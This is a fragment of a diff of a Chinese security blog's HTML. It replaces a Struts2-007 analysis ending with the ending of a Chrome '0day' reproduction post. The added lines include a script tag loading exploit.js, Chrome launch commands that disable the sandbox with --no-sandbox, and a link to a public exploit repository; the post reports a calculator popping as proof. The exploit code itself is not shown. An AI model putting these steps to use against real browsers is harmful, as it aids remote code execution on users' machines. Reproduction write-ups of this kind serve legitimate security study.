+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"exploit.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span> //加载exploit js文件</span><br></pre></td></tr></table></figure>
 
+<p>关闭浏览器沙箱</p>
+<figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#退出浏览器进程进行打开</span><br><span class="line">"C:<span class="symbol">\P</span>rogram Files (x86)<span class="symbol">\G</span>oogle<span class="symbol">\C</span>hrome<span class="symbol">\A</span>pplication<span class="symbol">\c</span>hrome.exe" -no-sandbox</span><br><span class="line">或</span><br><span class="line">"C:<span class="symbol">\P</span>rogram Files (x86)<span class="symbol">\G</span>oogle<span class="symbol">\C</span>hrome<span class="symbol">\A</span>pplication<span class="symbol">\c</span>hrome.exe" --args --no-sandbox</span><br></pre></td></tr></table></figure>
 
-
-<p><img src="/img/Struts2-007%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201225172935494.png" alt="image-20201225172935494"></p>
-<h4 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h4><p>使用 <code>org.apache.commons.lang.StringEscapeUtils.escapeJava()</code>来做了一下escape，防止再从引号里面逃逸出来。</p>
-<p><img src="/img/Struts2-007%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201225173722361.png" alt="image-20201225173722361"></p>
-<h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><p><a href="https://xz.aliyun.com/t/7971" target="_blank" rel="noopener">https://xz.aliyun.com/t/7971</a></p>
-<p><a href="https://cwiki.apache.org/confluence/display/WW/S2-007" target="_blank" rel="noopener">https://cwiki.apache.org/confluence/display/WW/S2-007</a></p>
+<p><img src="/img/chrome%200day/image-20210413160904379.png" alt="image-20210413160904379"></p>
+<p>打开exploit.html页面弹出计算器（Edge浏览器同样存在）</p>
+<p><img src="/img/chrome%200day/image-20210413160943095.png" alt="image-20210413160943095"></p>
+<h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><p><a href="https://github.com/r4j0x00/exploits/tree/master/chrome-0day" target="_blank" rel="noopener">https://github.com/r4j0x00/exploits/tree/master/chrome-0day</a></p>
+<p><a href="https://mp.weixin.qq.com/s/dZl_Urk8cOJ1Qbe16HBFGQ" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/dZl_Urk8cOJ1Qbe16HBFGQ</a></p>
 
       
     </div>
@@ -475,7 +452,7 @@
       
         <div class="post-tags">
           
-            <a href="/tags/Struts2/" rel="tag"><i class="fa fa-tag"></i>Struts2</a>
+            <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" rel="tag"><i class="fa fa-tag"></i>漏洞复现</a>
           
         </div>
       
@@ -488,8 +465,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2020/12/24/Struts2-004-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" rel="next" title="Struts2-004 漏洞分析">
-                <i class="fa fa-chevron-left"></i> Struts2-004 漏洞分析
+              <a href="/2021/02/01/%E8%A7%A3%E5%86%B3%E5%9B%BD%E5%86%85%E6%97%A0%E6%B3%95%E8%AE%BF%E9%97%AE-.github.io/" rel="next" title="解决国内无法访问 *.github.io">
+                <i class="fa fa-chevron-left"></i> 解决国内无法访问 *.github.io
               </a>
             
           </div>
@@ -498,8 +475,8 @@
 
           <div class="post-nav-prev post-nav-item">
             
-              <a href="/2021/01/29/VMware-%E5%AE%89%E8%A3%85%E9%BB%91%E8%8B%B9%E6%9E%9C%E7%B3%BB%E7%BB%9F(MacOS)/" rel="prev" title="VMware 安装黑苹果系统(MacOS)">
-                VMware 安装黑苹果系统(MacOS) <i class="fa fa-chevron-right"></i>
+              <a href="/2021/04/13/Linux-sudo%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%EF%BC%88CVE-2021-3156%EF%BC%89/" rel="prev" title="Linux sudo权限提升（CVE-2021-3156）漏洞复现">
+                Linux sudo权限提升（CVE-2021-3156）漏洞复现 <i class="fa fa-chevron-right"></i>
               </a>
             
           </div>
@@ -683,7 +660,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#漏洞概要"><span class="nav-text">漏洞概要</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#漏洞分析"><span class="nav-text">漏洞分析</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#修复"><span class="nav-text">修复</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#参考"><span class="nav-text">参考</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#漏洞描述"><span class="nav-text">漏洞描述</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#影响版本"><span class="nav-text">影响版本</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#环境介绍"><span class="nav-text">环境介绍</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#漏洞复现"><span class="nav-text">漏洞复现</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#参考"><span class="nav-text">参考</span></a></li></ol></div>
             
 
           </div>
